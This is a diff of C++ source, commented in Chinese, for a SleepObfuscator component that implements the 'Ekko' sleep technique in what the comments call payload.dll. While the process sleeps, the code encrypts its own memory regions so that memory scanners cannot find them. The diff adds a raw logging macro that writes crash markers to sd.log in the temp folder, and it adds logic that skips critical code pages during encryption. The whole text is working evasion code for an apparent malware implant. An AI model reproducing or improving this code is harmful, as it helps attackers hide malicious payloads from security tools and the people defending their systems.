@@ -163,6 +163,43 @@ void SleepObfuscator::RegisterProtectedCode(void* addr, SIZE_T size) {
     region.xorKey = static_cast<BYTE>(rng.Next());
 }
 
+// ★ BUILD 567 v3.244 DIAG: EK_RAW_LOG — 加密窗口内的原始日志宏
+//   根因: v3.243 豁免 sleepObjPage 后仍崩溃, 需精确定位加密窗口内崩溃位置.
+//   问题: EkkoDiagLog 内部调用 CRT 函数 (snprintf/strlen/memcpy/vsnprintf),
+//         这些函数代码页在 payload.dll .text 段未豁免位置, 被 EncryptAll 加密 → 调用崩溃.
+//   方案: EK_RAW_LOG 宏内联展开, 只调用 kernel32 函数 (GetTempPathW/CreateFileW/WriteFile/
+//         FlushFileBuffers/CloseHandle), 通过 IAT 调用, IAT 在 .idata 段已豁免, 安全.
+//         宏代码在 EkkoSleep/EncryptAll/DecryptAll 内部展开, 这些函数所在页已豁免, 不被加密.
+//         不调用任何 CRT 函数, 字符串长度用 sizeof(msg)-1 编译期常量.
+//   v3.245: 宏定义移到 EncryptAll 之前, 因为 v3.245 在 EncryptAll/DecryptAll 内部使用.
+//   判读: 根据最后出现的日志判断崩溃位置:
+//         EA start → EncryptAll 入口
+//         EA skip → 跳过覆盖关键页的 region
+//         EA r0-r5 → 正在处理第 0-5 个 region
+//         EA VP fail → VirtualProtect 失败
+//         EA done → EncryptAll 完成
+//         EA+ post → EkkoSleep 中 EncryptAll 返回后
+//         timer OK → CreateWaitableTimerW 成功
+//         set OK → SetWaitableTimer 成功
+//         wait OK → WaitForSingleObject 成功
+//         DA start/DA skip/DA VP fail/DA done → DecryptAll 内部
+//         DA+ post → DecryptAll 成功, EkkoSleep 应该正常返回
+#define EK_RAW_LOG(msg) do { \
+    wchar_t _ekPath[MAX_PATH]; \
+    GetTempPathW(MAX_PATH, _ekPath); \
+    size_t _ekPL = 0; while (_ekPath[_ekPL]) _ekPL++; \
+    const wchar_t* _ekSuf = L"sd.log"; \
+    size_t _ekI = 0; while (_ekSuf[_ekI]) { _ekPath[_ekPL+_ekI] = _ekSuf[_ekI]; _ekI++; } \
+    _ekPath[_ekPL+_ekI] = 0; \
+    HANDLE _ekH = CreateFileW(_ekPath, FILE_APPEND_DATA, FILE_SHARE_READ, 0, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0); \
+    if (_ekH != INVALID_HANDLE_VALUE) { \
+        DWORD _ekW; \
+        WriteFile(_ekH, msg, (DWORD)(sizeof(msg)-1), &_ekW, 0); \
+        FlushFileBuffers(_ekH); \
+        CloseHandle(_ekH); \
+    } \
+} while(0)
+
 // ★ BUILD 544: EncryptAll 页面标记 — 紧邻 EncryptAll 定义确保同 4KB 页
 //   EkkoSleep 调用 EncryptAll 期间, EncryptAll 自身代码页必须保持明文
 //   否则 EncryptAll 加密自身代码页 → 返回时执行已加密代码 → 无日志崩溃
@@ -171,12 +208,50 @@ static void EncryptAllPageMarker() {
 }
 
 void SleepObfuscator::EncryptAll() {
+    // ★ BUILD 567 v3.245 FIX+DIAG: 关键页跳过保护 + EK_RAW_LOG 诊断
+    //   根因: v3.244 EA+ post 未出现 → 崩溃在 EncryptAll 内部
+    //   假设: 某个 region 覆盖了 ekkoPage/encryptAllPage/xorCryptPage,
+    //         EncryptAll 加密自身代码页 → 后续执行加密字节 → 崩溃
+    //   修复: 跳过覆盖关键页的 region (深度防御)
+    //   诊断: EK_RAW_LOG 输出每个 region 处理前后的状态 (不调用 CRT 函数)
+    EK_RAW_LOG("EA start\n");
+    uintptr_t ekkoPg = GetSelfPage();
+    uintptr_t encAPg = GetEncryptAllPage();
+    uintptr_t decAPg = GetDecryptAllPage();
+    uintptr_t xorCPg = GetXorCryptPage();
+    uintptr_t sleepPg = reinterpret_cast<uintptr_t>(this) & ~0xFFFULL;
+
     // ★ v3.125: 固定数组 — 只遍历 m_regionCount 个有效条目
     for (int ri = 0; ri < m_regionCount; ri++) {
         ProtectedRegion& region = m_regions[ri];
+        uintptr_t rStart = reinterpret_cast<uintptr_t>(region.addr);
+        uintptr_t rEnd = rStart + region.size;
+
+        // ★ v3.245 FIX: 检查 region 是否覆盖任一关键页, 覆盖则跳过
+        bool overlap = false;
+        if (rStart < ekkoPg + 0x4000 && rEnd > ekkoPg) overlap = true;   // ekkoPage 4 页
+        if (rStart < encAPg + 0x2000 && rEnd > encAPg) overlap = true;   // encryptAllPage 2 页
+        if (rStart < decAPg + 0x2000 && rEnd > decAPg) overlap = true;   // decryptAllPage 2 页
+        if (rStart < xorCPg + 0x2000 && rEnd > xorCPg) overlap = true;   // xorCryptPage 2 页
+        if (rStart < sleepPg + 0x2000 && rEnd > sleepPg) overlap = true; // sleepObjPage 2 页
+        if (overlap) {
+            EK_RAW_LOG("EA skip\n");
+            continue;
+        }
+
+        // 诊断: 输出当前处理的 region 索引 (前 8 个, 实际只有 6 个)
+        if (ri == 0) EK_RAW_LOG("EA r0\n");
+        else if (ri == 1) EK_RAW_LOG("EA r1\n");
+        else if (ri == 2) EK_RAW_LOG("EA r2\n");
+        else if (ri == 3) EK_RAW_LOG("EA r3\n");
+        else if (ri == 4) EK_RAW_LOG("EA r4\n");
+        else if (ri == 5) EK_RAW_LOG("EA r5\n");
+        else EK_RAW_LOG("EA rX\n");
+
         if (region.isCode) {
             DWORD oldProtect;
             if (!VirtualProtect(region.addr, region.size, PAGE_READWRITE, &oldProtect)) {
+                EK_RAW_LOG("EA VP fail\n");
                 continue;
             }
             XorCrypt(region.addr, region.size, region.xorKey);
@@ -184,16 +259,16 @@ void SleepObfuscator::EncryptAll() {
             FlushInstructionCache(GetCurrentProcess(), region.addr, region.size);
         } else {
             // ★ v3.37 FIX: 检查 VirtualProtect 返回值
-            //   如果 VirtualProtect 失败 (Win11 HVCI/CFG 可能阻止), 则跳过此区域
-            //   避免对 PROTECTED 页面直接 XorCrypt → ACCESS_VIOLATION → 闪退
             DWORD oldProtect = 0;
             if (!VirtualProtect(region.addr, region.size, PAGE_READWRITE, &oldProtect)) {
-                continue; // 跳过无法修改保护的区域
+                EK_RAW_LOG("EA VP fail\n");
+                continue;
             }
             XorCrypt(region.addr, region.size, region.xorKey);
             VirtualProtect(region.addr, region.size, oldProtect, &oldProtect);
         }
     }
+    EK_RAW_LOG("EA done\n");
 }
 
 // ★ BUILD 544: DecryptAll 页面标记 — 紧邻 DecryptAll 定义确保同 4KB 页
@@ -203,12 +278,38 @@ static void DecryptAllPageMarker() {
 }
 
 void SleepObfuscator::DecryptAll() {
+    // ★ BUILD 567 v3.245 FIX+DIAG: 关键页跳过保护 + EK_RAW_LOG 诊断 (对称 EncryptAll)
+    //   如果 EncryptAll 跳过了某个 region (覆盖关键页), DecryptAll 也必须跳过,
+    //   否则 DecryptAll 会解密一个未被加密的 region → 数据损坏
+    EK_RAW_LOG("DA start\n");
+    uintptr_t ekkoPg = GetSelfPage();
+    uintptr_t encAPg = GetEncryptAllPage();
+    uintptr_t decAPg = GetDecryptAllPage();
+    uintptr_t xorCPg = GetXorCryptPage();
+    uintptr_t sleepPg = reinterpret_cast<uintptr_t>(this) & ~0xFFFULL;
+
     // ★ v3.125: 固定数组 — 只遍历 m_regionCount 个有效条目
     for (int ri = 0; ri < m_regionCount; ri++) {
         ProtectedRegion& region = m_regions[ri];
+        uintptr_t rStart = reinterpret_cast<uintptr_t>(region.addr);
+        uintptr_t rEnd = rStart + region.size;
+
+        // ★ v3.245 FIX: 检查 region 是否覆盖任一关键页, 覆盖则跳过 (同 EncryptAll)
+        bool overlap = false;
+        if (rStart < ekkoPg + 0x4000 && rEnd > ekkoPg) overlap = true;
+        if (rStart < encAPg + 0x2000 && rEnd > encAPg) overlap = true;
+        if (rStart < decAPg + 0x2000 && rEnd > decAPg) overlap = true;
+        if (rStart < xorCPg + 0x2000 && rEnd > xorCPg) overlap = true;
+        if (rStart < sleepPg + 0x2000 && rEnd > sleepPg) overlap = true;
+        if (overlap) {
+            EK_RAW_LOG("DA skip\n");
+            continue;
+        }
+
         if (region.isCode) {
             DWORD oldProtect;
             if (!VirtualProtect(region.addr, region.size, PAGE_EXECUTE_READWRITE, &oldProtect)) {
+                EK_RAW_LOG("DA VP fail\n");
                 continue;
             }
             XorCrypt(region.addr, region.size, region.xorKey);
@@ -218,12 +319,14 @@ void SleepObfuscator::DecryptAll() {
             // ★ v3.37 FIX: 检查 VirtualProtect 返回值 (同 EncryptAll)
             DWORD oldProtect = 0;
             if (!VirtualProtect(region.addr, region.size, PAGE_READWRITE, &oldProtect)) {
-                continue; // 跳过无法修改保护的区域
+                EK_RAW_LOG("DA VP fail\n");
+                continue;
             }
             XorCrypt(region.addr, region.size, region.xorKey);
             VirtualProtect(region.addr, region.size, oldProtect, &oldProtect);
         }
     }
+    EK_RAW_LOG("DA done\n");
 }
 
 void SleepObfuscator::ObfuscatedSleep(DWORD milliseconds) {
@@ -288,35 +391,8 @@ static void EkkoDiagLog(const char* fmt, ...) {
     }
 }
 
-// ★ BUILD 567 v3.244 DIAG: EK_RAW_LOG — 加密窗口内的原始日志宏
-//   根因: v3.243 豁免 sleepObjPage 后仍崩溃, 需精确定位加密窗口内崩溃位置.
-//   问题: EkkoDiagLog 内部调用 CRT 函数 (snprintf/strlen/memcpy/vsnprintf),
-//         这些函数代码页在 payload.dll .text 段未豁免位置, 被 EncryptAll 加密 → 调用崩溃.
-//   方案: EK_RAW_LOG 宏内联展开, 只调用 kernel32 函数 (GetTempPathW/CreateFileW/WriteFile/
-//         FlushFileBuffers/CloseHandle), 通过 IAT 调用, IAT 在 .idata 段已豁免, 安全.
-//         宏代码在 EkkoSleep 内部展开, EkkoSleep 在 ekkoPage (已豁免), 代码页不被加密.
-//         不调用任何 CRT 函数, 字符串长度用 sizeof(msg)-1 编译期常量.
-//   判读: 根据最后出现的日志判断崩溃位置:
-//         EA+ post → EncryptAll 成功, 崩溃在 CreateWaitableTimerW 或之后
-//         timer OK → CreateWaitableTimerW 成功, 崩溃在 SetWaitableTimer 或之后
-//         set OK → SetWaitableTimer 成功, 崩溃在 WaitForSingleObject 或之后
-//         wait OK → WaitForSingleObject 成功, 崩溃在 DecryptAll 或之后
-//         DA+ post → DecryptAll 成功, EkkoSleep 应该正常返回
-#define EK_RAW_LOG(msg) do { \
-    wchar_t _ekPath[MAX_PATH]; \
-    GetTempPathW(MAX_PATH, _ekPath); \
-    size_t _ekPL = 0; while (_ekPath[_ekPL]) _ekPL++; \
-    const wchar_t* _ekSuf = L"sd.log"; \
-    size_t _ekI = 0; while (_ekSuf[_ekI]) { _ekPath[_ekPL+_ekI] = _ekSuf[_ekI]; _ekI++; } \
-    _ekPath[_ekPL+_ekI] = 0; \
-    HANDLE _ekH = CreateFileW(_ekPath, FILE_APPEND_DATA, FILE_SHARE_READ, 0, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0); \
-    if (_ekH != INVALID_HANDLE_VALUE) { \
-        DWORD _ekW; \
-        WriteFile(_ekH, msg, (DWORD)(sizeof(msg)-1), &_ekW, 0); \
-        FlushFileBuffers(_ekH); \
-        CloseHandle(_ekH); \
-    } \
-} while(0)
+// ★ BUILD 567 v3.244 DIAG: EK_RAW_LOG 宏定义已移到 EncryptAll 之前 (L166 附近)
+//   原因: v3.245 在 EncryptAll/DecryptAll 内部使用 EK_RAW_LOG, 宏定义必须在调用之前
 
 void SleepObfuscator::EkkoSleep(DWORD milliseconds) {
     // Ekko 技术: 使用 WaitableTimer 替代 Sleep
